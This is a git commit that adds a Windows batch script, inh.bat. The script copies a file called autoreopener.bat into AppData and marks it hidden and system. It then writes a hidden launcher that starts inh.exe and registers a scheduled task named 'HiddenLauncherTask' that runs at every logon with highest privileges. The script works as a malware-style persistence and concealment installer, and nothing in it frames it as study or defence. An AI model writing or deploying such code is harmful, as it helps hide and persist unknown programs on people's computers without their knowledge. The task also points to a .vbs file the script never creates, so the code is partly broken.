765ae161cdae45dd23b0cd1033be823ad9325d9e
dexovision <dexovisio@gmail.com>
2025-11-24 23:44:52 -0600

    Add files via upload

---
+++ inh.bat
@@ -0,0 +1,36 @@
+@echo off
+set "src=%TEMP%\autoreopener.bat"
+set "appdata=%userprofile%\AppData"
+
+if not exist "%src%" (
+    echo Source file not found: %src%
+    pause
+    exit /b
+)
+
+copy "%src%" "%appdata%\autoreopener.bat" /Y
+attrib +h +s "%appdata%\autoreopener.bat"
+
+if %ERRORLEVEL%==0 (
+    echo File copied successfully.
+) else (
+    echo Copy failed. Check permissions.
+)
+
+
+set "outfile=%appdata%\launcher.bat"
+
+(
+    echo @echo off
+    echo start "" "%USERPROFILE%\AppData\inh.exe"
+    echo start "" "%USERPROFILE%\AppData\autoreopener.bat"
+) > "%outfile%"
+
+attrib +h +s "%appdata%\launcher.bat"
+
+set "LAUNCHER=%APPDATA%\launcher.bat"
+set "TASKNAME=HiddenLauncherTask"
+if not exist "%LAUNCHER%" exit /b
+schtasks /create /tn "%TASKNAME%" /tr "wscript.exe \"%LAUNCHER%.vbs\"" /sc onlogon /RL HIGHEST /F
+
+
